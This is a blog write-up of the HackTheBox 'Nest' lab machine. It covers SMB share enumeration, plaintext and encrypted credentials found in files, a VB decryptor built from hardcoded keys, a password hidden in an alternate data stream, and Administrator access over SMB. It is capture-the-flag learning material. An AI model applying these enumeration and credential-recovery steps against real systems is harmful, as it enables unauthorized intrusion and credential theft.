---
title: Write-up Nest Machine
author: pcw3r
date: 2020-06-06 11:33:00 +0800
categories: [HackTheBox, Pentest]
tags: [WINDOWS, EASY, ENUMERATION, REVIEW CODE, PASSWORD DECRYPT, ALTERNATE DATA STREAM]
math: true
---

**<center>RefÂ°: HTB-07-Pentest</center>**

![Desktop View]({{ "/assets/img/nest/HTB-Badge-Nest.png" | relative_url }})

--- Nest is a Windows machine which highlights the risks of an insecure file system through available and exploitable shares.

Review Code on two programs found in the SMB service, allows to decrypt the hash of a user and the administrator. The hash of the administrator being visible in a legacy service (HQK) using the debug password that was hidden in a file via ADS.


![Desktop View]({{ "/assets/img/nest/HTB-Information-Nest.png" | relative_url }})

## **<span style='color:#c0392b'>Discovery - Figure out environment</span>**
### Check all services
***
Nmap scan reveal smb service on her usual port and an other port assigned by a unknow service.

```terminal
$ nmap -Pn -T5 10.10.10.178 -p-
```

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-nmap.png" | relative_url }})

### Smb
***

This service reveal many shares visible without authentication : `ADMIN$, C$, Data, IPC$, Secure$, Users`

```terminal
$ smblcient -L 10.10.10.178
```

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-smbanonym.png" | relative_url }})

### HQK
***

Telnet connection on port `4386`, reveals service named `HQK Reporting Service V1.2`.

```terminal
$ telnet 10.10.10.178 4386
```

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-hqktelnet.png" | relative_url }})

### Vulnerabilities
***

No vulnerabilities identify here, but we have possibility to mount and enum shares in anonymous mode. We can exploit this to access and gain a foothold.

The connection to the HQK service is not protected by authentication. But at this point we don't have enough information to know how to exploit this path.

## **<span style='color:#c0392b'>Foothold - Get into the target </span>**
### Unsecured File Sharing
***

We have two shares that give access to the machine and gain foothold : `Data, Users`.
We switch to Windows to access these two shares and we enumerate to perform a lateral movement.

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-visibleshares.png" | relative_url }})

### Plaintext Password from email
***

We find temporary credentials below `\\10.10.10.178\Data\Shared\Templates\HR\Welcome Email.text`

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-welcome.png" | relative_url }})

### Remote Service SMB login
***

This temporary user give us more elements from smb service. `smbmap command` show us the possibility to access an a other share : `SECURE$`

```terminal
$ smbmap -u TempUser -p welcome2019 -H 10.10.10.178
```

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-smbtemp.png" | relative_url }})


## **<span style='color:#c0392b'>Lateral Movement - Move through environment</span>**
### Hashed Password from .xml file
***

We mount this share on our Windows machine with `net use command`.

```terminal
$ net use LETTER: \\10.10.10.178\SHARES /user:TempUser welcome2019
```

We find configuration file with `hash password` of user C.Smith below `\\10.10.10.178\Data\IT\Config\RU Scanner\RU_config.xml`

This file seem to be associated of program named `RU Scanner.`

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-ruconfig.png" | relative_url }})

### Reviewing Code of RU-Scanner Program
***
NotepadPlusPlus.xml file make reference to a subfolder in SECURE$ share at `line 99` : `Carl`

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-reffolder.png" | relative_url }})

In this subfolder, we find Visual Studio project named `RUScanner` under `\VB Project\WIP\RU\`.
We can find something interesting in this program to potentially decrypt hash ?

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-ruscanner.png" | relative_url }})

After reviewing the program with Visual Studio, we can find two interesting functions in the `utils.vb` object : `EncryptString, DecryptString`.

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-functiondecrypt.png" | relative_url }})

First, let's look at the encryption function that encrypted the password of the user C.Smith and result the hash found above.

```shell
Public Shared Function EncryptString(PlainString As String) As String
If String.IsNullOrEmpty(PlainString) Then
        Return String.Empty
Else
        Return Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
    End If
End Function
```

What we learn here is that to encrypt a string, we use the following :

* passPhrase = `N3st22`
* saltValue = `88552299`
* passwordIterations = `2`
* initVector = `464R5DFA5DL6LE28`
* keySize = `256`

So we have the possiblity to decrypt the hash from function DecryptString.

```shell
Public Shared Function DecryptString(EncryptedString As String) As String
If String.IsNullOrEmpty(EncryptedString) Then
        Return String.Empty
Else
        Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
    End If
End Function
```

### Decrypting Password
***

We create a new vb project and insert only the functions we need.

Reference - my vb program : <https://github.com/PCW3R/Tools-Programs/tree/master/Decrypt-Nest-Rfc2898DeriveBytes>

**Utils.vb :**
```shell
Imports System.Text
Imports System.Security.Cryptography
Public Class Utils

    Public Shared Function GetLogFilePath() As String
        Return IO.Path.Combine(Environment.CurrentDirectory, "Log.txt")
    End Function


    Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function Decrypt(ByVal cipherText As String,
                                   ByVal passPhrase As String,
                                   ByVal saltValue As String,
                                    ByVal passwordIterations As Integer,
                                   ByVal initVector As String,
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase,
                                           saltValueBytes,
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream,
                                        decryptor,
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes,
                                               0,
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes,
                                            0,
                                            decryptedByteCount)

        Return plainText
    End Function

End Class
```

**Program.vb :** We pass the hash value like EncryptedString and call the function DecryptString to result in console the password in plaintext of the user C.Smith.

```shell
Imports System

Module Program
  Sub Main(args As String())
        Console.WriteLine(Utils.DecryptString(EncryptedString:="fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="))
  End Sub
End Module
```

The password is decrypted : **xRxRxPANCAK3SxRxRx**

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-decryptresult1.png" | relative_url }})

### Flag user
***

And we flag the user.

```terminal
$ net use LETTER: \\10.10.10.178\USERS /user:C.Smith xRxRxPANCAK3SxRxRx
```

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-flaguser.png" | relative_url }})

## **<span style='color:#c0392b'>Privilege Escalation - Gain higher-level permissions</span>**
### Enumeration under C.Smith account
***
We enum under C.Smith account on SMB service and find several things :

* Program `HqkLdap.exe` can be find under `\\10.10.10.178\USERS\C.Smith\HQK Reporting\AD Integration Module\`

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-hqkldap.png" | relative_url }})

* A `configuration file` of the service HQK can be find under `\\10.10.10.178\USERS\C.Smith\HQK Reporting\HQK_Config_Backup.xml` with a reference to `port 4386`

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-port.png" | relative_url }})

* And `empty file` can be find under `\\10.10.10.178\USERS\C.Smith\HQK Reporting\Debug Mode Password.txt` with reference to `DEBUG Password` of the service HQK


### Debug Mode Password
***
The HQK service is accessible without authentication but it is useless in this context. To go further and find other interesting elements to raise our privileges, we need to find the Debug Mode Password of the service.

The file `Debug Mode Password.txt` seem to be empty on the face of it. But in reality the file hide data through `ADS`.

Reference - ADS tool : <https://docs.microsoft.com/en-us/sysinternals/downloads/streams>

ADS or Alternate Data Stream is the ability of an NTFS file system (the main file system format in Windows) to store different streams of data, in addition to the default stream which is normally used for a file.

ADS have been given a bad reputation because their capability to hide data from us on our own computer, has been abused by malware writers in the past. Here we use ADS to hide the debug password : **WBQ201953D8w**

Reference - ADS method : <https://www.asafety.fr/administration-reseaux-et-systemes/les-ads-de-windows-pour-camoufler-vos-fichiers-dans-des-fichiers/>

```
dir /R
Debug Mode Password.txt:Password:$DATA

more < "Debug Mode Password.txt":Password
```

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-ads.png" | relative_url }})

### Hashed Password through HQK
***
We use the Debug Password and find the hash password of the Administrator in `Ldap.conf`.

```terminal
$ telnet 10.10.10.178 4386
> DEBUG WBQ201953D8w
> SETDIR ..
> SETDIR ldap
> SHOWQUERY 2
```

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-hqk.png" | relative_url }})

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-hqk2.png" | relative_url }})

We have the hash and we're going to proceed in the same way to decrypt it. But we need to know the good values of `passPhrase / saltvalue / passwordIterations / initVector and keySize`.

### Reviewing Code HqkLdap.exe
***
We decompile the program HqkLdap.exe with `ILSpy tool` and find the correct values.

Reference - ILSpy tool : <https://github.com/icsharpcode/ILSpy>

* passPhrase = `667912`
* saltValue = `1313Rf99`
* passwordIterations = `3`
* initVector = `1L1SA61493DRV53Z`
* keySize = `256`

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-decompil.png" | relative_url }})

### Decrypting Password
***

We replace this values in our program :

```html
Else
Return Decrypt(EncryptedString, "passPhrase", "saltValue", "passwordIterations", "initvector", "keySize")
End If
```

And pass the hash value to decrypt the password : **XtH4nkS4Pl4y1nGX**

```shell
Imports System

Module Program
  Sub Main(args As String())
        Console.WriteLine(Utils.DecryptString(EncryptedString:="yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="))
  End Sub
End Module
```

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-decryptresult2.png" | relative_url }})

We get full control of Nest machine.

### Flag root
***
```shell
$ net use LETTER: \\10.10.10.178\C$ /user:Administrator XtH4nkS4Pl4y1nGX
```

![Desktop View]({{ "/assets/img/nest/HTB-Images-Nest-flagroot.png" | relative_url }})

***

## **<center>Trophy</center>**

> **Look up at the stars and not down at your feet.**
>
> Stephen Hawking
